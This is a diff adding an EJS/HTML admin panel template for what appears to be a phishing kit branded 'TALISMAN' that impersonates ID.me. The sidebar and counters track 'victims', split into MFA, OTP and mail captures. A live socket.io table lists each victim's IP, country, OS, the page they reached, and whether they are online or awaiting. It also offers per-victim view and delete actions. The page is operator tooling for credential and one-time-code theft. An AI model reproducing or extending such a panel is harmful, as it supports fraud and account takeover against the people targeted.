@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-nav-layout="vertical" data-theme-mode="light" data-header-styles="light"
+    data-menu-styles="dark" data-toggled="close">
+
+<head>
+
+    <!-- Meta Data -->
+    <meta charset="UTF-8">
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=no'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title> ID.me - Admin Panel</title>
+    <meta name="keywords"
+        content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit.">
+
+    <!-- Favicon -->
+    <link rel="icon" href="../assets/images/brand-logos/favicon.ico" type="image/x-icon">
+
+    <!-- Choices JS -->
+    <script src="../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script>
+
+    <!-- Main Theme Js -->
+    <script src="../assets/js/main.js"></script>
+
+    <!-- Bootstrap Css -->
+    <link id="style" href="../assets/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Style Css -->
+    <link href="../assets/css/styles.min.css" rel="stylesheet">
+
+    <!-- Icons Css -->
+    <link href="../assets/css/icons.css" rel="stylesheet">
+
+    <!-- Node Waves Css -->
+    <link href="../assets/libs/node-waves/waves.min.css" rel="stylesheet">
+
+    <!-- Simplebar Css -->
+    <link href="../assets/libs/simplebar/simplebar.min.css" rel="stylesheet">
+
+    <!-- Color Picker Css -->
+    <link rel="stylesheet" href="../assets/libs/flatpickr/flatpickr.min.css">
+    <link rel="stylesheet" href="../assets/libs/@simonwep/pickr/themes/nano.min.css">
+
+    <!-- Choices Css -->
+    <link rel="stylesheet" href="../assets/libs/choices.js/public/assets/styles/choices.min.css">
+
+
+    <link rel="stylesheet" href="../assets/libs/jsvectormap/css/jsvectormap.min.css">
+
+    <link rel="stylesheet" href="../assets/libs/swiper/swiper-bundle.min.css">
+
+</head>
+
+<body>
+
+
+
+    <div class="page">
+        <!-- app-header -->
+        <header class="app-header">
+
+            <!-- Start::main-header-container -->
+            <div class="main-header-container container-fluid">
+
+                <!-- Start::header-content-left -->
+                <div class="header-content-left">
+
+                    <!-- Start::header-element -->
+                    <div class="header-element">
+                        <div class="horizontal-logo">
+                            <a href="https://t.me/talisman_development" class="header-logo">
+                                TALISMAN &copy;
+                            </a>
+                        </div>
+                    </div>
+                    <!-- End::header-element -->
+
+                    <!-- Start::header-element -->
+                    <div class="header-element">
+                        <!-- Start::header-link -->
+                        <a aria-label="Hide Sidebar"
+                            class="sidemenu-toggle header-link animated-arrow hor-toggle horizontal-navtoggle"
+                            data-bs-toggle="sidebar" href="javascript:void(0);"><span></span></a>
+                        <!-- End::header-link -->
+                    </div>
+                    <!-- End::header-element -->
+
+                </div>
+                <!-- End::header-content-left -->
+
+                <!-- Start::header-content-right -->
+                <div class="header-content-right">
+
+                    <!-- Start::header-element -->
+                    <div class="header-element header-search">
+                        <!-- Start::header-link -->
+                        <a href="javascript:void(0);" class="header-link" data-bs-toggle="modal"
+                            data-bs-target="#searchModal">
+                            <i class="bx bx-search-alt-2 header-link-icon"></i>
+                        </a>
+                        <!-- End::header-link -->
+                    </div>
+                    <!-- End::header-element -->
+
+
+                    <!-- Start::header-element -->
+                    <div class="header-element">
+                        <!-- Start::header-link|dropdown-toggle -->
+                        <a href="#" class="header-link dropdown-toggle" id="mainHeaderProfile" data-bs-toggle="dropdown"
+                            data-bs-auto-close="outside" aria-expanded="false">
+                            <div class="d-flex align-items-center">
+                                <div class="me-sm-2 me-0">
+                                    <img src="../assets/tl-logo.jpg" alt="img" width="32" height="32"
+                                        class="rounded-circle">
+                                </div>
+                                <div class="d-sm-block d-none">
+                                    <p class="fw-semibold mb-0 lh-1">
+                                        <%= username %>
+                                    </p>
+                                    <span class="op-7 fw-normal d-block fs-11">Administrator</span>
+                                </div>
+                            </div>
+                        </a>
+                        <!-- End::header-link|dropdown-toggle -->
+                        <ul class="main-header-dropdown dropdown-menu pt-0 overflow-hidden header-profile-dropdown dropdown-menu-end"
+                            aria-labelledby="mainHeaderProfile">
+                            <li>
+                                <form action="/admin/logout" method="post">
+                                    <button class="dropdown-item d-flex" type="submit"><i
+                                            class="ti ti-logout fs-18 me-2 op-7"></i>Log Out</button>
+                                </form>
+                            </li>
+                        </ul>
+                    </div>
+                    <!-- End::header-element -->
+
+
+                </div>
+                <!-- End::header-content-right -->
+
+            </div>
+            <!-- End::main-header-container -->
+
+        </header>
+        <!-- /app-header -->
+        <!-- Start::app-sidebar -->
+        <aside class="app-sidebar sticky" id="sidebar">
+
+            <!-- Start::main-sidebar-header -->
+            <div class="main-sidebar-header">
+                <a href="https://t.me/talisman_development" class="header-logo text-white">
+                    TALISMAN &copy;
+                </a>
+            </div>
+            <!-- End::main-sidebar-header -->
+
+            <!-- Start::main-sidebar -->
+            <div class="main-sidebar" id="sidebar-scroll">
+
+                <!-- Start::nav -->
+                <nav class="main-menu-container nav nav-pills flex-column sub-open">
+                    <div class="slide-left" id="slide-left">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24"
+                            viewBox="0 0 24 24">
+                            <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z"></path>
+                        </svg>
+                    </div>
+                    <ul class="main-menu">
+                        <!-- Start::slide__category -->
+                        <li class="slide__category"><span class="category-name">Main</span></li>
+                        <!-- End::slide__category -->
+
+                        <!-- Start::slide -->
+                        <li class="slide has-sub">
+                            <a href="javascript:void(0);" class="side-menu__item">
+                                <i class="bx bx-home side-menu__icon"></i>
+                                <span class="side-menu__label">Dashboards</span>
+                                <i class="fe fe-chevron-right side-menu__angle"></i>
+                            </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1">
+                                    <a href="javascript:void(0)">Dashboards</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/dashboard" class="side-menu__item">Main</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/all" class="side-menu__item">Victims - ALL</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/mfa" class="side-menu__item">Victims - MFA</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/otp" class="side-menu__item">Victims - OTP</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/mail" class="side-menu__item">Victims - MAIL</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <!-- End::slide -->
+                    </ul>
+                    <div class="slide-right" id="slide-right"><svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191"
+                            width="24" height="24" viewBox="0 0 24 24">
+                            <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z"></path>
+                        </svg></div>
+                </nav>
+                <!-- End::nav -->
+
+            </div>
+            <!-- End::main-sidebar -->
+
+        </aside>
+        <!-- End::app-sidebar -->
+
+        <!-- Start::app-content -->
+        <div class="main-content app-content">
+            <div class="container-fluid">
+
+                <!-- Start::page-header -->
+
+                <div class="d-md-flex d-block align-items-center justify-content-between my-4 page-header-breadcrumb">
+                    <div>
+                        <p class="fw-semibold fs-18 mb-0">Welcome back, <%= username %> !</p>
+                        <span class="fs-semibold text-muted">Track your logs activity here.</span>
+                    </div>
+                </div>
+
+                <!-- End::page-header -->
+
+                <!-- Start::row-1 -->
+                <div class="row">
+                    <div class="col-xxl-3 col-xl-3 col-lg-6 col-md-6">
+                        <div class="card custom-card">
+                            <div class="card-body">
+                                <div class="d-flex align-items-top">
+                                    <div class="flex-fill">
+                                        <div
+                                            class="d-flex flex-wrap align-items-center justify-content-between fs-14 mb-2">
+                                            <span class="flex-fill">VICTIMS</span>
+                                        </div>
+                                        <div class="d-flex flex-wrap align-items-center justify-content-between">
+                                            <h5 class="fw-semibold mb-0"><%= victimsCount %></h5>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-3 col-xl-3 col-lg-6 col-md-6">
+                        <div class="card custom-card">
+                            <div class="card-body">
+                                <div class="d-flex align-items-top">
+                                    <div class="flex-fill">
+                                        <div
+                                            class="d-flex flex-wrap align-items-center justify-content-between fs-14 mb-2">
+                                            <span class="flex-fill">ONLINE VICTIMS</span>
+                                        </div>
+                                        <div class="d-flex flex-wrap align-items-center justify-content-between">
+                                            <h5 class="fw-semibold mb-0"><%= onlineSessions %></h5>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-3 col-xl-3 col-lg-6 col-md-6">
+                        <div class="card custom-card">
+                            <div class="card-body">
+                                <div class="d-flex align-items-top">
+                                    <div class="flex-fill">
+                                        <div
+                                            class="d-flex flex-wrap align-items-center justify-content-between fs-14 mb-2">
+                                            <span class="flex-fill">AWAITING VICTIMS</span>
+                                        </div>
+                                        <div class="d-flex flex-wrap align-items-center justify-content-between">
+                                            <h5 class="fw-semibold mb-0"><%= awaitingSessions %></h5>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-3 col-xl-3 col-lg-6 col-md-6">
+                        <div class="card custom-card">
+                            <div class="card-body">
+                                <div class="d-flex align-items-top">
+                                    <div class="flex-fill">
+                                        <div
+                                            class="d-flex flex-wrap align-items-center justify-content-between fs-14 mb-2">
+                                            <span class="flex-fill">FINISHED VICTIMS</span>
+                                        </div>
+                                        <div class="d-flex flex-wrap align-items-center justify-content-between">
+                                            <h5 class="fw-semibold mb-0"><%= finishedSessions %></h5>
+
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!--End::row-1 -->
+
+                <div class="row">
+                    <div class="col-xl-12">
+                        <div class="card custom-card">
+                            <div class="card-header justify-content-between">
+                                <div class="card-title">
+                                    VICTIMS
+                                </div>
+                            </div>
+                            <div class="card-body">
+                                <div class="table-responsive">
+                                    <table class="table text-nowrap" id="data-table">
+                                        <thead>
+                                            <tr>
+                                                <th scope="col">#</th>
+                                                <th scope="col">STATUS</th>
+                                                <th scope="col">IP</th>
+                                                <th scope="col">COUNTRY</th>
+                                                <th scope="col">OS</th>
+                                                <th scope="col">PAGE</th>
+                                                <th scope="col">CREATED AT</th>
+                                                <th scope="col">ACTION</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <% if (sessions.length> 0) { %>
+                                                <% for (session of sessions) { %>
+                                                    <tr>
+                                                        <td>
+                                                            <div class="d-flex align-items-center">
+                                                                <%= session.session.visitorId %>
+                                                            </div>
+                                                        </td>
+                                                        <td><span class="badge bg-primary-transparent">
+                                                                <%= session.session.status===true ? 'Online' : 'Offline'
+                                                                    %>
+                                                            </span>
+                                                        </td>
+                                                        <td>
+                                                            <%= session.session.ip %>
+                                                        </td>
+                                                        <td>
+                                                            <%= session.session.country %>
+                                                        </td>
+                                                        <td>
+                                                            <%= session.session.os %>
+                                                        </td>
+                                                        <td><span class="badge bg-warning-transparent">
+                                                                <%= session.session.page %>
+                                                            </span>
+                                                        </td>
+                                                        <td>
+                                                            <%= session.session.createdAt %>
+                                                        </td>
+                                                        <td>
+                                                            <div class="hstack gap-2 fs-15">
+                                                                <a href="/admin/dashboard/victim/<%= session.session.visitorId %>"
+                                                                    class="btn btn-icon btn-sm btn-success"><i
+                                                                        class="ri-eye-line"></i></a>
+                                                                <form
+                                                                    action="/admin/dashboard/victim/delete/<%= session.session.visitorId %>"
+                                                                    method="post">
+                                                                    <button type="submit"
+                                                                        class="btn btn-icon btn-sm btn-info"><i
+                                                                            class="ri-delete-bin-fill"></i></button>
+                                                                </form>
+                                                            </div>
+                                                        </td>
+                                                    </tr>
+                                                    <%}%>
+                                                        <% } %>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            <div class="card-footer d-none border-top-0">
+                                <!-- Prism Code -->
+                                <pre class="language-html"><code class="language-html">&lt;div class="table-responsive"&gt;
+    &lt;table class="table text-nowrap"&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th scope="col"&gt;&lt;input class="form-check-input" type="checkbox" id="checkboxNoLabel" value="" aria-label="..."&gt;&lt;/th&gt;
+                &lt;th scope="col"&gt;Team Head&lt;/th&gt;
+                &lt;th scope="col"&gt;Category&lt;/th&gt;
+                &lt;th scope="col"&gt;Role&lt;/th&gt;
+                &lt;th scope="col"&gt;Gmail&lt;/th&gt;
+                &lt;th scope="col"&gt;Team&lt;/th&gt;
+                &lt;th scope="col"&gt;Work Progress&lt;/th&gt;
+                &lt;th scope="col"&gt;Revenue&lt;/th&gt;
+                &lt;th scope="col"&gt;Action&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            &lt;tr&gt;
+                &lt;th scope="row"&gt;&lt;input class="form-check-input" type="checkbox" id="checkboxNoLabel1" value="" aria-label="..."&gt;&lt;/th&gt;
+                &lt;td&gt;
+                    &lt;div class="d-flex align-items-center"&gt;
+                        &lt;span class="avatar avatar-xs me-2 online avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/3.jpg" alt="img"&gt;
+                        &lt;/span&gt;Mayor Kelly
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;Manufacturer&lt;/td&gt;
+                &lt;td&gt;&lt;span class="badge bg-primary-transparent"&gt;Team Lead&lt;/span&gt;&lt;/td&gt;
+                &lt;td&gt;mayorkrlly@gmail.com&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="avatar-list-stacked"&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/2.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/8.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/2.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;a class="avatar avatar-sm bg-primary text-fixed-white avatar-rounded" href="javascript:void(0);"&gt;
+                            +4
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="progress progress-xs"&gt;
+                        &lt;div class="progress-bar bg-primary" role="progressbar" style="width: 52%" aria-valuenow="52" aria-valuemin="0" aria-valuemax="100"&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;$10,984.29&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="hstack gap-2 fs-15"&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-success"&gt;&lt;i class="ri-download-2-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-info"&gt;&lt;i class="ri-edit-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+            &lt;/tr&gt;
+            &lt;tr&gt;
+                &lt;th scope="row"&gt;&lt;input class="form-check-input" type="checkbox" id="checkboxNoLabel2" value="" aria-label="..."&gt;&lt;/th&gt;
+                &lt;td&gt;
+                    &lt;div class="d-flex align-items-center"&gt;
+                        &lt;span class="avatar avatar-xs me-2 online avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/12.jpg" alt="img"&gt;
+                        &lt;/span&gt;Andrew Garfield
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;Managing Director&lt;/td&gt;
+                &lt;td&gt;&lt;span class="badge bg-warning-transparent"&gt;Director&lt;/span&gt;&lt;/td&gt;
+                &lt;td&gt;andrewgarfield@gmail.com&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="avatar-list-stacked"&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/1.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/5.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/11.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/15.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;a class="avatar avatar-sm bg-primary text-fixed-white avatar-rounded" href="javascript:void(0);"&gt;
+                            +4
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="progress progress-xs"&gt;
+                        &lt;div class="progress-bar bg-primary" role="progressbar" style="width: 91%" aria-valuenow="91" aria-valuemin="0" aria-valuemax="100"&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;$1.4billion&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="hstack gap-2 fs-15"&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-success"&gt;&lt;i class="ri-download-2-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-info"&gt;&lt;i class="ri-edit-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+            &lt;/tr&gt;
+            &lt;tr&gt;
+                &lt;th scope="row"&gt;&lt;input class="form-check-input" type="checkbox" id="checkboxNoLabel3" value="" aria-label="..."&gt;&lt;/th&gt;
+                &lt;td&gt;
+                    &lt;div class="d-flex align-items-center"&gt;
+                        &lt;span class="avatar avatar-xs me-2 online avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/14.jpg" alt="img"&gt;
+                        &lt;/span&gt;Simon Cowel
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;Service Manager&lt;/td&gt;
+                &lt;td&gt;&lt;span class="badge bg-success-transparent"&gt;Manager&lt;/span&gt;&lt;/td&gt;
+                &lt;td&gt;simoncowel234@gmail.com&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="avatar-list-stacked"&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/6.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/16.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;a class="avatar avatar-sm bg-primary text-fixed-white avatar-rounded" href="javascript:void(0);"&gt;
+                            +10
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="progress progress-xs"&gt;
+                        &lt;div class="progress-bar bg-primary" role="progressbar" style="width: 45%" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100"&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;$7,123.21&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="hstack gap-2 fs-15"&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-success"&gt;&lt;i class="ri-download-2-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-info"&gt;&lt;i class="ri-edit-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+            &lt;/tr&gt;
+            &lt;tr&gt;
+                &lt;th scope="row"&gt;&lt;input class="form-check-input" type="checkbox" id="checkboxNoLabel13" value="" aria-label="..."&gt;&lt;/th&gt;
+                &lt;td&gt;
+                    &lt;div class="d-flex align-items-center"&gt;
+                        &lt;span class="avatar avatar-xs me-2 online avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/5.jpg" alt="img"&gt;
+                        &lt;/span&gt;Mirinda Hers
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;Recruiter&lt;/td&gt;
+                &lt;td&gt;&lt;span class="badge bg-danger-transparent"&gt;Employee&lt;/span&gt;&lt;/td&gt;
+                &lt;td&gt;mirindahers@gmail.com&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="avatar-list-stacked"&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/3.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/10.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;span class="avatar avatar-sm avatar-rounded"&gt;
+                            &lt;img src="../assets/images/faces/14.jpg" alt="img"&gt;
+                        &lt;/span&gt;
+                        &lt;a class="avatar avatar-sm bg-primary text-fixed-white avatar-rounded" href="javascript:void(0);"&gt;
+                            +6
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="progress progress-xs"&gt;
+                        &lt;div class="progress-bar bg-primary" role="progressbar" style="width: 21%" aria-valuenow="21" aria-valuemin="0" aria-valuemax="100"&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+                &lt;td&gt;$2,325.45&lt;/td&gt;
+                &lt;td&gt;
+                    &lt;div class="hstack gap-2 fs-15"&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-success"&gt;&lt;i class="ri-download-2-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a href="javascript:void(0);" class="btn btn-icon btn-sm btn-info"&gt;&lt;i class="ri-edit-line"&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/td&gt;
+            &lt;/tr&gt;
+        &lt;/tbody&gt;
+    &lt;/table&gt;
+&lt;/div&gt;</code></pre>
+                                <!-- Prism Code -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <!-- End::app-content -->
+
+        <div class="modal fade" id="searchModal" tabindex="-1" aria-labelledby="searchModal" aria-hidden="true">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-body">
+                        <div class="input-group">
+                            <a href="javascript:void(0);" class="input-group-text" id="Search-Grid"><i
+                                    class="fe fe-search header-link-icon fs-18"></i></a>
+                            <input type="search" class="form-control border-0 px-2" placeholder="Search"
+                                aria-label="Username">
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <div class="btn-group ms-auto">
+                            <button class="btn btn-sm btn-primary-light">Search</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="scrollToTop">
+        <span class="arrow"><i class="ri-arrow-up-s-fill fs-20"></i></span>
+    </div>
+    <div id="responsive-overlay"></div>
+
+    <!-- Popper JS -->
+    <script src="../assets/libs/@popperjs/core/umd/popper.min.js"></script>
+
+    <!-- Bootstrap JS -->
+    <script src="../assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Defaultmenu JS -->
+    <script src="../assets/js/defaultmenu.min.js"></script>
+
+    <!-- Node Waves JS-->
+    <script src="../assets/libs/node-waves/waves.min.js"></script>
+
+    <!-- Sticky JS -->
+    <script src="../assets/js/sticky.js"></script>
+
+    <!-- Simplebar JS -->
+    <script src="../assets/libs/simplebar/simplebar.min.js"></script>
+    <script src="../assets/js/simplebar.js"></script>
+
+    <!-- Color Picker JS -->
+    <script src="../assets/libs/@simonwep/pickr/pickr.es5.min.js"></script>
+
+
+    <!-- JSVector Maps JS -->
+    <script src="../assets/libs/jsvectormap/js/jsvectormap.min.js"></script>
+
+    <!-- JSVector Maps MapsJS -->
+    <script src="../assets/libs/jsvectormap/maps/world-merc.js"></script>
+
+    <!-- Apex Charts JS -->
+    <script src="../assets/libs/apexcharts/apexcharts.min.js"></script>
+
+    <!-- Chartjs Chart JS -->
+    <script src="../assets/libs/chart.js/chart.min.js"></script>
+
+    <!-- CRM-Dashboard -->
+    <script src="../assets/js/crm-dashboard.js"></script>
+
+
+    <!-- Custom-Switcher JS -->
+    <script src="../assets/js/custom-switcher.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="../assets/js/custom.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        const updateTable = (data) => {
+            const tableBody = document.querySelector('#data-table tbody');
+            tableBody.innerHTML = ''
+
+            for (const session of data) {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                <td>
+                                                            <div class="d-flex align-items-center">
+                                                                ${session.session.visitorId}
+                                                            </div>
+                                                        </td>
+                                                        <td><span class="badge bg-primary-transparent">
+                                                            ${session.session.status === true ? 'Online' : 'Offline'}
+                                                            </span>
+                                                        </td>
+                                                        <td>
+                                                            ${session.session.ip}
+                                                        </td>
+                                                        <td>
+                                                            ${session.session.country}
+                                                        </td>
+                                                        <td>
+                                                            ${session.session.os}
+                                                        </td>
+                                                        <td><span class="badge bg-warning-transparent">
+                                                                ${session.session.page}
+                                                            </span>
+                                                        </td>
+                                                        <td>
+                                                            ${session.session.createdAt}
+                                                        </td>
+                                                        <td>
+                                                            <div class="hstack gap-2 fs-15">
+                                                                <a href="/admin/dashboard/victim/${session.session.visitorId}"
+                                                                    class="btn btn-icon btn-sm btn-success"><i
+                                                                        class="ri-eye-line"></i></a>
+                                                                <form
+                                                                    action="/admin/dashboard/victim/delete/${session.session.visitorId}"
+                                                                    method="post">
+                                                                    <button type="submit"
+                                                                        class="btn btn-icon btn-sm btn-info"><i
+                                                                            class="ri-delete-bin-fill"></i></button>
+                                                                </form>
+                                                            </div>
+                                                        </td>
+                `;
+                tableBody.appendChild(row);
+            }
+        };
+
+        socket.on('session-update', (change) => {
+            
+
+            fetch('/admin/api/session-data').then((response) => response.json()).then((data) => {
+                updateTable(data)
+            }).catch((error) => {
+                console.error('Error fetching data: ', error);
+            })
+        })
+
+        const fetchData = () => {
+            fetch('/admin/api/session-data').then((response) => response.json())
+                .then((data) => {
+                    updateTable(data); // Update the table with the initial data
+                })
+                .catch((error) => {
+                    console.error('Error fetching data:', error);
+                });
+        }
+
+        window.addEventListener('load', () => {
+            fetchData();
+        });
+    </script>
+</body>
+
+</html>
